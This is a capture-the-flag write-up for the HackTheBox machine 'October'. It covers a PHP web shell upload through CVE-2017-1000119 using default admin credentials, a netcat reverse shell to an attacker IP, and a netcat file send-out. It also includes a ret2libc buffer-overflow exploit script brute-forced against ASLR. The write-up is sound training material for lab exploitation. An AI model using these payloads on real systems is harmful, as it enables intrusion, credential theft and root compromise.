# October [HTB](https://app.hackthebox.com/machines/15)
![october-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/october-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 october.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/ports-02.png)


From here, I send `nmap` to start probing the found ports for more info:

```bash
nmap -p 22,80 -sCV october.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/nmap-res-03.png)

We have the following:

+ An SSH server on port 22.
+ An Apache/2.4.7 server on port 80.


Only two services are publicly exposed on this box, with the Apache server being the most interesting. 


Let's have a look! 


## Apache Port 80

Browsing towards `http://october.htb` returns the following page:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/site-04.png)


We can see three main links on the home page, each leads to it's own dedicated directory of `/account`, `/blog` & `/forum`. Based on the title of the page, we can guess that the website is powered by [October CMS](https://en.wikipedia.org/wiki/October_(CMS)), which is an open source PHP based CMS, the source code can be found on [thier Github](https://github.com/octobercms/october).


After making a request to the site, the server gives us with the following cookie: 

![cookie-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/cookie-05.png)


The `october_session` cookie is a base64 encoded string. Decoding it results in the following:

![decode-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/decode-06.png)


We can see a JSON object with the keys: `iv`, `value` & `mac`. The first two keys hold another base64 encoded string, though decoding them returns what looks like cipher text. The `mac` value is actually a SHA256 digest, though trying to crack it with hashcat or looking it up at [crackstation](https://crackstation.net/) fails. So it's unclear at the moment if we can exploit this cookie. 


At this point I started interacting with the website itself, I went over the Github of the October CMS, and started digging into every directory and file, trying to find something useful. And while I did managed to find a couple of interesting files, for example in the `/config` directory, trying to access thoes resources from the target faild. Running a directory and file scan didn't help shed additional light on the subject either. 


Then, I started checking the resources availble on the main page of the site. I found that the `/blog` & `/forum` pages are fairly empty. The `/account` page has a login and a sign up form:

![account-page-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/account-page-07.png)


Trying a few basic credentials like `admin : admin`, `october : passwd` failed. I also tried creating an account, though this didn't change the sites behaviour at all.  


At this point I started searching online for ways of exploitng the October CMS, and I found [this wonderful page](https://bitflipper.eu/finding/2017/04/october-cms-v10412-several-issues.html), which outlines a few different attack vectors to try. 


In section 5, they mention that the admin area could be located at `http://october.htb/backend/cms`, and indeed if we open this URL we get redirected to an admin login page:

![admin-page-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/admin-page-08.png)


My first attempt of `admin : admin` worked:

![admin-area-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/admin-area-09.png)


### Admin Area

In the admin panel, we can exploit the media upload feature to upload a php web shell. This vulnerability is known as `CVE-2017-1000119`, which is caused due to poor file extension validation in the `/vendor/october/rain/src/Filesystem/Definitions.php` script which forgets to exclude the `.php5` file extension. 


To start, I create a simple web shell using:

```bash
echo "<?php system(\$_GET['x']); ?>" > htb.php5
```

![create-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/create-10.png)


Then, in the admin panel I click on `Media` -> `Upload`, and select my PHP web shell:

![upload-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/upload-11.png)


From here, we can interact with our webshell at `http://october.htb/storage/app/media/htb.php5` to get RCE:

![rce-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/rce-12.png)


Now I use Burp's encoder to URL encode the following payload for a reverse shell:

```bash
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.63 443 >/tmp/f
```

I start my local listener with:

```bash
rlwrap nc -lnvp 443
```

And send my reverse shell payload to the target using `curl` and I get a shell:

![shell-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/shell-13.png)


## Privilege Escalation


After I land on the box, I spwan a TTY shell using: 

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then I start going through the October CMS installation files. I know that there is a `/config/database.php` script that should contain credentials to a backend database, so I immediately go for it:

![database-creds-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/database-creds-14.png)


We can see the credentials to a MySQL database. Lcukliy, the target has the `mysql` command installed so we connect to the database using: 

```bash
mysql -h 127.0.0.1 -u "october" -D "october" -p
```

![db-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/db-14.png)


The `october` table is the only custom table on the server, so I select it and list all the tables:

![tables-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/tables-15.png)


The `backend_users` looks the most interesting, so I dump everything from it:

![dump-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/dump-16.png)


We see two user accounts of `harry` & `admin`, the former is actually a user on the system:

![users-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/users-17.png)


If we [identify](https://hashes.com/en/tools/hash_identifier) the hashes we will find that they are Blowfish hashes. 


We already know the password for the admin which is `admin`, but we can try to crack harry's hash with:

```bash
hashcat -m 3200 -a 0 "$2y$10$4tBYxIpkBpR9.coxVUdeJetCp77EFLp1U2o/f2.wlKaBbe698aIzO" /usr/share/wordlists/rockyou.txt
```

Unfortunately, I wasn't able to crack `harry`'s hash. 


While hashcat was running I kept looking around the filesystem until I saw an interesting SUID binary:

```bash
find / -perm -4000 2>/dev/null | tail -1
```

![suid-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/suid-18.png)


If we check the file's permissions we can see root is the owner:

![ll-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/ll-19.png)


The name of the file is a strong hint for buffer-overflow, I transfer this file by starting a local netcat listener on my atack machine:

```bash
nc -lnvp 9001 > ovflw 
```

And cat out the file from the target, piping it to my netcat listener: 

```bash
cat ovflw | nc 10.10.14.63 9001
```

### Buffer Overflow

Once I got the file over to my attack machine I start analyzing it. Let's run `readelf` on it to get a general overview:

```bash
readelf -h ovflw
```

![readelf-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/readelf-20.png)


We can see it's a 32-bit executable binary in little endian format. From here, I run it a couple of times and find that an input of around 125 bytes causes a segmentation fault:

![crash-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/crashed-21.png)


So it is vulnerable to buffer overflows. 


I then run `checksec` on the binary to idenfify any protection it may have:

![checksec-21.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/checksec-21.5.png)


NX means that the stack is not executable, so we can't write our shell code right after the EIP register, rather we need to find the memory address of the `system()` function so we can execute something else. 


Let's see if the binary has ASLR enabled:

![aslr-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/aslr-22.png)


We can see that the ASLR is enabled in the kernel, and running `ldd` shows that the address of `libc` changes each time. So to exploit this binary we need to think about a [retrun2libc attack](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc). 


The idea is to use gadgets already present in the program's memory space to spawn a shell. To do that, we need to find the offests of the following gadgets:

+ Start address of libc: this is the base of all other values.
+ The offset of the string `/bin/sh` in the specific libc version in use
+ The offset of the `system()` call
+ The offset of `exit()` to prevent the application from crashing after the shell has exited


We then need to calculate the actual memory address of said gadgets, by adding them to the offset to the libc base address value. With the goal of overwriting the stack as such: 

```bash
<Junk Byte> * 112 (Offset)
<Address of system()> (new EIP)
<Address of exit()> (new return address)
<Address of /bin/sh string> (Argument for system())
```

Which should launch `system(/bin/sh)`.


But because ASLR is enabled, the memory address space of the binary is different each time it executes. So we can't reliably predict the correct memory addresses of said gadgets, thus making it more difficult to develop an exploit. This however, can be somewhat circumvented againts 32-bit binaries. 


Since memory addresses are sammler on a 32-bit binary, it's possible to use one base `libc` address, and calculate all gadgets addresses againts this base `libc` address as if ASLR was disabled. Then, we can execute our exploit in an endless loop, until eventually the `libc` address in the program's runtime will match with our exploit, thus all other gadgets addresses match as well, and we will get a shell.


This approach on a 32-bit binary is plausible, as the memory address space layout is small enough for a brute force attack of this sorts to pay out after a reasonable amount of iterations. Compared to a 64-bit binary, where memory address layout is much larger, thus rendering this sorts of attack counterintuitive.


Let's start by finding the offset to the EIP, for which I use pattern_create. I create an alias for it, and run it as such:

```bash
alias pattern_create=/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
pattern_create -l 125
```

From here, I stat `gdb` on the binary and define the following function:

```gdb
(gdb) define asciiprint
 set $len = sizeof($arg0)
 set $val = (unsigned long long)($arg0)
 while $len-- > 0
   set $char = $val & 0xff
   if $char >= 0x20 && $char <= 0x7e
     printf "%c", $char
   else
     printf "\\x%02x", $char
   end
   set $val >>= 8
 end
 printf "\n"
end
```

Then, I copy the output pattern from pattern_create, and run the binary supplying the pattern I copied:

![eip-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/crashed-eip-23.png)


We can see the binary crahsed because we overwrote the EIP with an invalid return address. Now I use the function we defined earlier to get the ASCII value in the EIP register:

![value-eip-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/value-eip-24.png)


And supply the EIP value to `pattern_offset` to get the offset value to the EIP register:

```bash
alias pattern_offset=/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
pattern_offset -q d7Ad
```

![match-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/match-25.png)


Now that we got control over the EIP, we need to find the offset values of the gadgets againts the targte's libc version. 


Let's start with the libc base address, for that we can use `ldd`:

![ldd-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/ldd-26.png)


For `/bin/sh` we can use `strings`:

```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
```

![strings-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/strings-27.png)


To find the values for the `system()` and `exit()` functions, we can use `readelf`:

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
```

![values-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/values-28.png)

So here are all the offset values we need:

+ libc: 0xb75a2000
+ system(): 0x00040310
+ exit(): 0x00033260
+ /bin/sh: 0x00162bac


Therefore, our exploit should look something like this:

```python
#!/usr/bin/python2.7

import struct 
import sys

EIP_OFFSET = 112

libc_start = 0xb75a2000
binsh_offset = 0x00162bac
system_offset = 0x00040310
exit_offset = 0x00033260

system_addr = libc_start + system_offset
exit_addr = libc_start + exit_offset
binsh_addr = libc_start + binsh_offset

payload = ""

while len(payload) < EIP_OFFSET:
    payload += "\x90" # NOP

payload += struct.pack("<I",system_addr)
payload += struct.pack("<I",exit_addr)
payload += struct.pack("<I",binsh_addr)


sys.stdout.write(payload)
``` 

I host the exploit up using a python web server:

```python
python3 -m http.server 80
```

And download the exploit from the target using:

```bash
cd /tmp
wget http://10.10.14.63/exploit.py; chmod +x exploit.py
```

From there, we run our exploit in an endless loop, untill eventually, the memory address space layout of the binary will match with our exploit, thus giving us a shell: 

```bash
while true; do echo -ne "."; ovrflw $(/tmp/exploit.py); done
```

After a few seconds I get a shell:

![root-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/October/img/root-29.png)
